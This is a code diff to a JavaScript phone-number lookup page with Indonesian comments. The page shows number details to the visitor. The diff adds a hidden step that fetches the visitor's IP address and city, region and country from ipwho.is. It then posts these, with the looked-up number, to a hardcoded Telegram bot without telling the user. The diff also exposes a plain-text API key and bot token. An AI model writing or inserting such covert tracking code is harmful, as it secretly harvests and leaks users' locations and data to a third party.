@@ -9,7 +9,7 @@ function cekNomor() {
 
   fetch(`https://api.apilayer.com/number_verification/validate?number=${nomor}`, {
     headers: {
-      "apikey": "axl1F57lkrG7iorwlHBQuocWAjHhTl7O" // API KEY kamu
+      "apikey": "axl1F57lkrG7iorwlHBQuocWAjHhTl7O"
     }
   })
   .then(res => res.json())
@@ -22,20 +22,30 @@ function cekNomor() {
     const hasil = `
       <strong>Nomor:</strong> ${data.international_format}<br>
       <strong>Negara:</strong> ${data.country_name}<br>
-      <strong>Lokasi:</strong> ${data.location}<br>
       <strong>Operator:</strong> ${data.carrier}
     `;
     resultBox.innerHTML = hasil;
 
-    // Kirim ke Telegram
-    const msg = `Nomor dilacak:\n${data.international_format}\nNegara: ${data.country_name}\nLokasi: ${data.location}\nOperator: ${data.carrier}`;
-    fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
-      method: "POST",
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-      },
-      body: `chat_id=6466187930&text=${encodeURIComponent(msg)}`
-    });
+    // Ambil lokasi IP & gabungkan
+    fetch("https://ipwho.is/")
+      .then(res => res.json())
+      .then(ip => {
+        const pesan = `Nomor dilacak:
+${data.international_format}
+Negara: ${data.country_name}
+Operator: ${data.carrier}
+Lokasi IP: ${ip.city}, ${ip.region}, ${ip.country}
+IP: ${ip.ip}`;
+
+        // Kirim ke Telegram
+        fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
+          method: "POST",
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: `chat_id=6466187930&text=${encodeURIComponent(pesan)}`
+        });
+      });
   })
   .catch(err => {
     console.error(err);
